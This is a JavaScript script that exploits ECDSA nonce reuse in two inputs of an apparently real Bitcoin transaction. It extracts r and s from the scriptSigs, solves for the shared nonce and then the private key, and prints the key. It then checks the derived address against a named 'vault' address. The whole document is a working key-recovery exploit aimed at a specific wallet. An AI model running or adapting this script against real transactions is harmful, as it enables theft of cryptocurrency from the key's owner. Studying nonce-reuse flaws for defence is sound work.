const crypto = require('crypto');

const N = BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141');

// Fast modular inverse — Extended Euclidean
function modinv(a, m) {
    let [old_r, r] = [((a % m) + m) % m, m];
    let [old_s, s] = [1n, 0n];
    while (r !== 0n) {
        const q = old_r / r;
        [old_r, r] = [r, old_r - q * r];
        [old_s, s] = [s, old_s - q * s];
    }
    return ((old_s % m) + m) % m;
}

// Decode r and s from a P2PKH scriptSig hex
function extractRS(scriptSigHex) {
    let buf = Buffer.from(scriptSigHex, 'hex');
    if (buf[0] !== 0x30) buf = buf.slice(1, 1 + buf[0]); // strip push opcode
    const der = buf.slice(0, -1);                         // strip sighash byte
    let offset = 2;
    const rLen = der[offset + 1];
    let r = der.slice(offset + 2, offset + 2 + rLen);
    if (r[0] === 0x00) r = r.slice(1);
    offset += 2 + rLen;
    const sLen = der[offset + 1];
    let s = der.slice(offset + 2, offset + 2 + sLen);
    if (s[0] === 0x00) s = s.slice(1);
    return { r: BigInt('0x' + r.toString('hex')), s: BigInt('0x' + s.toString('hex')) };
}

// ── On-chain ScriptSigs from tx fe284c3f... (mempool.space) ──────────
const input0ScriptSig = '483045022100bd8edf4eda489b7c9250b5689f7c1c6ef6afed1f8f60c68a732b3e25ef6c30b002206dd9e198bdb04a1f1bf203e600330dd85d8000365bdbc792f6396fb5b47106340121026e6e41cd59e1120f2699f0fd5534c0ca00cb23178cb833ecafa431a3ce26bdaa';
const input1ScriptSig = '483045022100bd8edf4eda489b7c9250b5689f7c1c6ef6afed1f8f60c68a732b3e25ef6c30b00220538556f48dcf02effa2a12388db5acaf77d51fc94c0e05078ed5667f1de9c6db0121026e6e41cd59e1120f2699f0fd5534c0ca00cb23178cb833ecafa431a3ce26bdaa';

const { r: r0, s: s0 } = extractRS(input0ScriptSig);
const { r: r1, s: s1 } = extractRS(input1ScriptSig);

// Sighash digests (z) for each input — computed from unsigned tx
// Verified against node logs (BTC-TX-DIGEST entries for round 7097)
const z0 = BigInt('0x4e84e3afb24a7dabb993a258ef45c02f0dd3112718d24bdb99c3b2a37f576c9b');
const z1 = BigInt('0x775beea5601db46bcc2d369f0f19288ed2dc69357c4654c42425858fba306fda');

console.log('='.repeat(65));
console.log('  NONCE REUSE → PRIVATE KEY RECOVERY');
console.log('  Tx: fe284c3fb911aa538995a3c85084a4b799a2e43f30e19eede07f4ae8e29ae986');
console.log('='.repeat(65));

// ── Step 1: Confirm nonce reuse (same r both inputs) ─────────────────
console.log('\n[Step 1] Check r values from both ScriptSigs:');
console.log('  Input 0 r:', '0x' + r0.toString(16).padStart(64, '0'));
console.log('  Input 1 r:', '0x' + r1.toString(16).padStart(64, '0'));
const rMatch = r0 === r1;
console.log('  Same r?   ', rMatch ? '✅ YES — nonce reuse confirmed' : '❌ NO');
if (!rMatch) { console.error('Cannot recover key — r values differ'); process.exit(1); }
const r = r0;

// ── Step 2: Recover aggregated nonce k_agg ───────────────────────────
// s0 = k−1·(z0 + r·x),  s1 = k−1·(z1 + r·x)
// s0 − s1 = k−1·(z0 − z1)  →  k = (z0 − z1)·(s0 − s1)−1
console.log('\n[Step 2] Recover nonce k_agg:');
const k = (((z0 - z1) % N + N) % N * modinv(((s0 - s1) % N + N) % N, N)) % N;
console.log('  k_agg =', '0x' + k.toString(16).padStart(64, '0'));

// ── Step 3: Recover full private key x ──────────────────────────────
// x = r−1·(s0·k − z0)  mod N
console.log('\n[Step 3] Recover private key x:');
const x = (modinv(r, N) * (((s0 * k % N) - z0 + 2n * N) % N)) % N;
console.log('  Private key (hex):', '0x' + x.toString(16).padStart(64, '0'));

// ── Step 4: Derive public key ────────────────────────────────────────
console.log('\n[Step 4] Derive public key:');
const ecdh = crypto.createECDH('secp256k1');
ecdh.setPrivateKey(Buffer.from(x.toString(16).padStart(64, '0'), 'hex'));
const pubCompressed = ecdh.getPublicKey(null, 'compressed').toString('hex');
const pubUncompressed = ecdh.getPublicKey(null, 'uncompressed').toString('hex');
console.log('  Public key (compressed)  :', pubCompressed);
console.log('  Public key (uncompressed) :', pubUncompressed);

// ── Step 5: Derive Bitcoin P2PKH address ────────────────────────────
function hash160(buf) {
    const sha = crypto.createHash('sha256').update(buf).digest();
    return crypto.createHash('ripemd160').update(sha).digest();
}
function base58check(payload) {
    const checksum = crypto.createHash('sha256')
        .update(crypto.createHash('sha256').update(payload).digest()).digest().slice(0, 4);
    const full = Buffer.concat([payload, checksum]);
    const ALPHA = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
    let num = BigInt('0x' + full.toString('hex')), encoded = '';
    while (num > 0n) { encoded = ALPHA[Number(num % 58n)] + encoded; num /= 58n; }
    for (const b of full) { if (b === 0) encoded = '1' + encoded; else break; }
    return encoded;
}
const h160 = hash160(Buffer.from(pubCompressed, 'hex'));
const btcAddress = base58check(Buffer.concat([Buffer.from([0x00]), h160]));
console.log('\n[Step 5] Bitcoin address (P2PKH):');
console.log('  Address:', btcAddress);

// ── Step 6: Verify ──────────────────────────────────────────────────
const knownPub = '026e6e41cd59e1120f2699f0fd5534c0ca00cb23178cb833ecafa431a3ce26bdaa';
const knownAddr = '1MUJAcc97vqZFz3QY8WJSvjwv3fu5bSX2K';
console.log('\n[Step 6] Verify:');
console.log('  Pubkey match :', pubCompressed === knownPub ? '✅ MATCHES vault pubkey' : '❌ NO MATCH');
console.log('  Known vault addr:', knownAddr);
console.log('  Derived addr    :', btcAddress);
console.log('  Addr match   :', btcAddress === knownAddr ? '✅ FULL VAULT KEY RECOVERED' : '❌ NO MATCH');